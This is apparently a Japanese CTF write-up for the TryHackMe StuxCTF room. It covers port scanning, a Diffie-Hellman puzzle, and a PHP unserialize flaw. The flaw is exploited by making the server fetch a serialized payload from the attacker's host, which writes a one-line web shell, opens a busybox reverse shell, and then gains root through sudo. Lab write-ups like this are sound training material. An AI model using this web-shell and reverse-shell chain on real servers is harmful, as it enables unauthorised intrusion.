# StuxCTF

https://tryhackme.com/room/stuxctf

## Enumeration

```shell
TARGET=10.201.109.241
sudo bash -c "echo $TARGET   stux.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sS -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

SSH, HTTP

トップページ

```html
<html>
	<head>
		<title>Default Page</title>
	</head>
	<body>
		<!-- The secret directory is...
		p: 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251;
		g: 7;
		a: 330;
		b: 450;
		g^c: 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617;
		-->
		is blank....
	</body>
</html>
```

robots.txt に書かれているディレクトリは存在しない。が、`Diffie-Hellman` という記述がある。

```sh
$ cat ./robots.txt 
# robots.txt generated by StuxCTF
# Diffie-Hellman
User-agent: *
Disallow: 
Disallow: /StuxCTF/
```

## 隠しディレクトリ

設問3にこんな表記がある。

```
What is the hidden directory?
HINT: g ^ a mod p, g ^ b mod p, g ^ C mod p
first 128 characters ... 
```

```python
>>> p=9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251
... g=7
... a=330
... b=450
... gc=6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617
... 
... gca = (gc**a) % p
... gcab = (gca**b) % p
... 
... print(str(gcab)[:128])
... 
[REDACTED]
```

またソースにヒント。

```html
<!-- hint: /?file= -->
```

/?file=index.php をリクエストし、`From Hex` -> `Reverse` -> `Base64` デコードするとPHPソースが出てきた。

```php
<br />
error_reporting(0);<br />
class file {<br />
        public $file = "dump.txt";<br />
        public $data = "dump test";<br />
        function __destruct(){<br />
                file_put_contents($this->file, $this->data);<br />
        }<br />
}<br />
<br />
<br />
$file_name = $_GET['file'];<br />
if(isset($file_name) && !file_exists($file_name)){<br />
        echo "File no Exist!";<br />
}<br />
<br />
if($file_name=="index.php"){<br />
        $content = file_get_contents($file_name);<br />
        $tags = array("", "");<br />
        echo bin2hex(strrev(base64_encode(nl2br(str_replace($tags, "", $content)))));<br />
}<br />
unserialize(file_get_contents($file_name));<br />
# 以下略
```

- file クラスでファイル保存している。
- file_get_contents でファイル取得し、その内容を unserialize に渡している。
- デシリアライズで $file, $data を改変すれば、任意のファイルを保存させることができる。

file_get_contentsはPHPフィルターのようなことはできないので、狙った内容のファイルを読ませる必要があるがその方法が問題。  
ダメもとで /?file=http://10.11.146.32:8000/test としてみたら、リクエストが来た。

```sh
$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.201.109.241 - - [13/Nov/2025 17:24:41] code 404, message File not found
10.201.109.241 - - [13/Nov/2025 17:24:41] "GET /test HTTP/1.0" 404 -
```

改変したfileクラスをシリアライズする。

```php
<?php
class file {
        public $file = "rev.php";
        public $data = '<?=`$_GET[0]`?>';
}

$maliciousFile = new file();
$serializedData = serialize($maliciousFile);
echo $serializedData;
?>
```

この実行結果をファイル保存し、サーバーからリクエストさせたら、サーバー上に rev.php ファイルが保存された。

rev.php を使い、busyboxでリバースシェルを取得できた。

```sh
$ nc -lnvp 8888  
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.109.241] 49512
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

ユーザーフラグ取得

```sh
www-data@ubuntu:/home/grecia$ pwd
/home/grecia

www-data@ubuntu:/home/grecia$ ls -al
total 44
drwxr-xr-x 4 grecia grecia 4096 Aug  8  2019 .
drwxr-xr-x 3 root   root   4096 Aug  8  2019 ..
-rw------- 1 grecia grecia 6237 Aug  8  2019 .bash_history
-rw-r--r-- 1 grecia grecia  220 Aug  8  2019 .bash_logout
-rw-r--r-- 1 grecia grecia 3771 Aug  8  2019 .bashrc
drwx------ 2 grecia grecia 4096 Aug  8  2019 .cache
drwxrwxr-x 2 grecia grecia 4096 Aug  8  2019 .nano
-rw-r--r-- 1 grecia grecia  655 Aug  8  2019 .profile
-rw-r--r-- 1 grecia grecia    0 Aug  8  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 grecia grecia  183 Aug  8  2019 .wget-hsts
-rw-rw-r-- 1 grecia grecia   33 Aug  8  2019 user.txt
```

## 権限昇格

雑！

```sh
www-data@ubuntu:/home/grecia$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: ALL
```

```sh
www-data@ubuntu:/home/grecia$ sudo bash -p
root@ubuntu:/home/grecia# id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- 最初、`Diffie-Hellman`の前提知識がなさ過ぎて何を問われているのかすら分からなかった。共通鍵を求めること自体が`Diffie-Hellman`の目的。暗号の特訓が必要。
- デシリアライズは自力で解決できたので良かった。
- fileパラメータを自力で発見しなければならないパターンもあり得た。
